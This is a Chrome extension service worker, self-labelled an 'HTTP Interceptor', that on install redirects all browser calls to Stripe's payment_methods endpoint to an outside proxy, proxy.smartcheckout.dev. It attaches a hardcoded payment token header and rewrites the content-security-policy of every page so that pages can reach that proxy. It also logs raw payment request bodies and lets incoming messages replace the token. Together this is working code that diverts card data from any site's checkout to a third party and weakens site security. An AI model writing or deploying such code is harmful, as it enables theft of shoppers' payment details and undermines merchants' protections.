// background service worker for the Chrome extension

// Adjust this pattern to match whatever endpoint you care about.
const TARGET_PATTERN = "api.stripe.com/v1/payment_methods";

// Helper function to decode request body
function decodeRequestBody(requestBody) {
  if (!requestBody) return null;
  
  if (requestBody.formData) {
    return `Form Data: ${JSON.stringify(requestBody.formData, null, 2)}`;
  }
  
  if (requestBody.raw) {
    const decoder = new TextDecoder();
    const bodyParts = requestBody.raw.map(part => {
      if (part.bytes) {
        return decoder.decode(new Uint8Array(part.bytes));
      }
      return '';
    });
    return bodyParts.join('');
  }
  
  return null;
}

async function setPaymentToken(token) {
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [2],
    addRules: [{
      id: 2,
      priority: 2,
      action: {
        type: "modifyHeaders",
        requestHeaders: [
          { header: "SC-TARGET-URL",  operation: "set",
            value: "https://api.stripe.com/v1/payment_methods" },
          { header: "SC-PAYMENT-TOKEN", operation: "set", value: token }
        ]
      },
      condition: { urlFilter: "||proxy.smartcheckout.dev/", resourceTypes: ["xmlhttprequest"] }
    }]
  });
}

chrome.runtime.onInstalled.addListener(() => setPaymentToken(
  "cct_sandbox_67e43af3e5a2f03b2f9d5e66519e9f9933dfaaaca9b12f4d3eea268025b92fbc"
));

// listen for external update requests
chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
  if (msg.type === "SET_PAYMENT_TOKEN") {
    setPaymentToken(msg.token)
      .then(() => sendResponse({ ok: true }))
      .catch(err => sendResponse({ ok: false, error: String(err) }));
    return true;            // keep the message channel open for the async work
  }
});

// Set up declarative rules for redirect and header modification
chrome.runtime.onInstalled.addListener(async () => {
  try {
    // Clear existing rules
    await chrome.declarativeNetRequest.updateDynamicRules({
      removeRuleIds: [1, 2, 3]
    });

    // Add redirect rule with header modification in one rule
    await chrome.declarativeNetRequest.updateDynamicRules({
      addRules: [
        {
          id: 1,
          priority: 1,
          action: {
            type: "redirect",
            redirect: {
              url: "https://proxy.smartcheckout.dev"
            }
          },
          condition: {
            urlFilter: "||api.stripe.com/v1/payment_methods",
            resourceTypes: ["xmlhttprequest"]
          }
        },
        {
          id: 2,
          priority: 2,
          action: {
            type: "modifyHeaders",
            requestHeaders: [
              {
                header: "SC-TARGET-URL",
                operation: "set",
                value: "https://api.stripe.com/v1/payment_methods"
              },
              {
                header: "SC-PAYMENT-TOKEN",
                operation: "set",
                value: "cct_sandbox_67e43af3e5a2f03b2f9d5e66519e9f9933dfaaaca9b12f4d3eea268025b92fbc"
              }
            ]
          },
          condition: {
            urlFilter: "||proxy.smartcheckout.dev/",
            resourceTypes: ["xmlhttprequest"]
          }
        },
        {
          id: 3,
          priority: 3,
          action: {
            type: "modifyHeaders",
            responseHeaders: [
              {
                header: "content-security-policy",
                operation: "set",
                value: "connect-src 'self' https://api.stripe.com https://errors.stripe.com https://js.stripe.com https://r.stripe.com https://checkout-cookies.stripe.com https://stripe.com/cookie-settings/enforcement-mode https://merchant-ui-api.stripe.com https://proxy.smartcheckout.dev"
              }
            ]
          },
          condition: {
            urlFilter: "*",
            resourceTypes: ["main_frame", "sub_frame"]
          }
        }
      ]
    });

    console.log("[HTTP Interceptor] Declarative rules set up for proxy redirection");
    
    // Debug: List current rules
    const rules = await chrome.declarativeNetRequest.getDynamicRules();
    console.log("[HTTP Interceptor] Current dynamic rules:", rules);
    
  } catch (error) {
    console.error("[HTTP Interceptor] Error setting up rules:", error);
  }
});

// Log original requests to Stripe API
chrome.webRequest.onBeforeRequest.addListener(
  details => {
    const url = details.url;
    if (url.includes(TARGET_PATTERN)) {
      console.log("[HTTP Interceptor] Original Stripe request detected:");
      console.log("[HTTP Interceptor] URL:", url);
      console.log("[HTTP Interceptor] Method:", details.method);
      
      // Print request body if available
      if (details.requestBody) {
        const body = decodeRequestBody(details.requestBody);
        if (body) {
          console.log("[HTTP Interceptor] Request Body:", body);
        }
      }
    }
  },
  { urls: ["*://api.stripe.com/v1/payment_methods*"] },
  ["requestBody"]
);

// Log headers being sent to proxy
chrome.webRequest.onBeforeSendHeaders.addListener(
  details => {
    const url = details.url;
    if (url.includes("proxy.smartcheckout.dev")) {
      console.log("[HTTP Interceptor] Headers being sent to proxy:");
      console.log("[HTTP Interceptor] URL:", url);
      console.log("[HTTP Interceptor] Headers:", details.requestHeaders);
    }
  },
  { urls: ["*://proxy.smartcheckout.dev/*"] },
  ["requestHeaders"]
);

// Log proxy responses
chrome.webRequest.onResponseStarted.addListener(
  details => {
    const url = details.url;
    if (url.includes("proxy.smartcheckout.dev")) {
      console.log("[HTTP Interceptor] Proxy response received:");
      console.log("[HTTP Interceptor] Status:", details.statusCode);
      console.log("[HTTP Interceptor] Headers:", details.responseHeaders);
    }
  },
  { urls: ["*://proxy.smartcheckout.dev/*"] },
  ["responseHeaders"]
);
